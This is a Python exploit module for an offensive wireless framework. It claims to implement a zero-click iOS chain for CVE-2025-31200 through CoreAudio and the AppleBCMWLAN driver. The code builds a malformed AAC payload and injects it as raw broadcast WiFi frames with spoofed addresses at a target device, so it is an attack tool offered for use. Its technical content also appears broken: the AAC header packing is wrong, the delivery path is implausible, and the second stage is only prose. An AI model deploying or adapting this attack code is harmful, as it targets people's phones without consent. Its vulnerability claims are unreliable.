# Author: André Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """iOS CoreAudio + AppleBCMWLAN Zero-Click Chain via iMessage (CVE-2025-31200).

    A critical zero-click exploit chain targeting Apple iOS devices.  The
    first stage exploits CVE-2025-31200, an out-of-bounds write in the
    CoreAudio framework triggered by processing a crafted audio stream.
    When combined with a vulnerability in the AppleBCMWLAN WiFi driver
    (the Broadcom WiFi chipset driver used in iPhones), the chain
    achieves arbitrary code execution without any user interaction.

    The attack vector uses iMessage to deliver a specially crafted audio
    attachment that triggers the CoreAudio vulnerability during automatic
    media processing.  The second stage leverages the WiFi driver flaw
    to escape the app sandbox and gain kernel-level access.

    Apple confirmed exploitation in the wild (March 2025).

    CVSS v3.1: 9.8 (Critical), AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "iOS CoreAudio + AppleBCMWLAN Zero-Click Chain (CVE-2025-31200)",
        "description": (
            "Proof-of-concept for CVE-2025-31200, a zero-click exploit chain "
            "targeting iOS.  Stage 1: CoreAudio OOB write via crafted audio "
            "stream delivered through iMessage.  Stage 2: AppleBCMWLAN WiFi "
            "driver vulnerability for sandbox escape and kernel access.  "
            "Exploited in the wild per Apple advisory."
        ),
        "authors": (
            "Apple Security Engineering (advisory)",
            "Google TAG (wild exploitation report)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2025-31200",
            "https://support.apple.com/en-us/HT214306",
            "https://blog.google/threat-analysis-group/",
        ),
        "disclosure_date": "2025-03-12",
        "platform": "ios",
        "arch": "arm64",
        "privileged": True,
        "targets": (
            "iOS before 18.3.2",
            "iPadOS before 18.3.2",
            "iPhone 12 through iPhone 16 Pro Max",
        ),
    }

    target = OptIP("", "Target device IP (for WiFi-based delivery)")
    port = OptPort(5223, "APNs port (for iMessage vector simulation)")
    timeout = OptFloat(10.0, "Connection timeout")
    interface = OptString("wlan0mon", "Monitor-mode interface for WiFi stage")
    delivery_method = OptString(
        "wifi",
        "Delivery method: wifi (direct WiFi frames) or simulate (local test only)",
    )

    # CoreAudio AAC constants
    _AAC_SYNC_WORD = 0xFFF1
    _AAC_PROFILE_LC = 1
    _AAC_SAMPLE_RATE_44100 = 4
    _AAC_CHANNEL_STEREO = 2

    # AppleBCMWLAN constants
    _FRAME_TYPE_DATA = 0x02
    _SUBTYPE_QOS_DATA = 0x08
    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_BSSID = b"\x02\x00\x00\x00\x00\x01"
    _FAKE_SRC = b"\x02\x00\x00\x00\x00\x02"

    def _build_malformed_aac_frame(self) -> bytes:
        """Build a malformed AAC frame that triggers the CoreAudio OOB write.

        The vulnerability is in the AAC decoder's handling of the
        scale factor band codebook selection.  A crafted AAC frame with
        invalid codebook indices causes the decoder to write past the
        allocated spectral data buffer.
        """
        sync_and_header = struct.pack(">H", self._AAC_SYNC_WORD)

        profile = self._AAC_PROFILE_LC
        sample_rate_idx = self._AAC_SAMPLE_RATE_44100
        channel_config = self._AAC_CHANNEL_STEREO
        frame_length = 1024

        header_bits = (
            (profile << 14)
            | (sample_rate_idx << 10)
            | (0 << 9)  # private bit
            | (channel_config << 6)
        )
        header_bytes = struct.pack(">H", header_bits)

        # Malformed Individual Channel Stream (ICS) with invalid
        # scale factor band codebook that triggers the OOB write
        ics_payload = b"\xFF" * 32  # Invalid codebook indices
        padding = b"\x00" * 128

        # Frame length field (13 bits) intentionally set larger than actual
        length_field = struct.pack(">H", (frame_length & 0x1FFF) << 3)

        return sync_and_header + header_bytes + length_field + ics_payload + padding

    def _build_radiotap_header(self) -> bytes:
        return struct.pack("<BBHI", 0, 0, 8, 0)

    def _build_wifi_delivery_frame(self, payload: bytes) -> bytes:
        """Wrap the exploit payload in a WiFi data frame for injection."""
        fc_low = (self._FRAME_TYPE_DATA & 0x03) | ((self._SUBTYPE_QOS_DATA & 0x0F) << 4)
        fc = struct.pack("<BB", fc_low, 0x01)
        duration = struct.pack("<H", 0)
        dst = self._BROADCAST
        seq_ctrl = struct.pack("<H", 0)
        qos_ctrl = struct.pack("<H", 0)

        header = fc + duration + dst + self._FAKE_BSSID + self._FAKE_SRC + seq_ctrl + qos_ctrl
        radiotap = self._build_radiotap_header()
        return radiotap + header + payload

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        """Verify the exploit delivery channel is available."""
        if str(self.delivery_method) == "simulate":
            return True
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        raw.close()
        return True

    def run(self) -> None:
        if not self.check():
            print_error(
                "Delivery channel not available. For WiFi delivery, ensure "
                f"{self.interface} is in monitor mode."
            )
            return

        print_success("Delivery channel ready; preparing exploit chain")
        self._exploit()

    def _exploit(self) -> None:
        aac_payload = self._build_malformed_aac_frame()
        print_status(f"Stage 1: CoreAudio AAC exploit payload: {len(aac_payload)} bytes")
        print_info("Malformed AAC frame with invalid codebook indices for OOB write")

        if str(self.delivery_method) == "simulate":
            print_status("Simulation mode: payload generated but not delivered")
            print_info(f"AAC payload hex (first 32 bytes): {aac_payload[:32].hex()}")
            print_info(
                "In a real attack, this payload is embedded in an iMessage "
                "audio attachment.  CoreAudio processes it automatically "
                "during media preview generation, triggering the OOB write "
                "without user interaction."
            )
            print_status("Stage 2: AppleBCMWLAN sandbox escape")
            print_info(
                "After gaining code execution in the media processing "
                "sandbox via Stage 1, Stage 2 exploits the AppleBCMWLAN "
                "WiFi driver to escape the sandbox and achieve kernel "
                "access.  This requires proximity to the target's WiFi."
            )
            return

        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw WiFi socket for delivery")
            return

        wifi_frame = self._build_wifi_delivery_frame(aac_payload)
        print_status(f"Stage 2: WiFi delivery frame: {len(wifi_frame)} bytes")

        injected = 0
        for i in range(16):
            try:
                raw.send(wifi_frame)
                injected += 1
            except OSError:
                pass
            time.sleep(0.05)

        raw.close()

        print_status(f"Injected {injected}/16 WiFi frames with exploit payload")
        print_info(
            "If a vulnerable iOS device processes the malformed AAC data "
            "and the AppleBCMWLAN driver is exploitable, the chain achieves "
            "kernel-level code execution.  Monitor for device behavior "
            "changes (crash, respring, etc.)."
        )
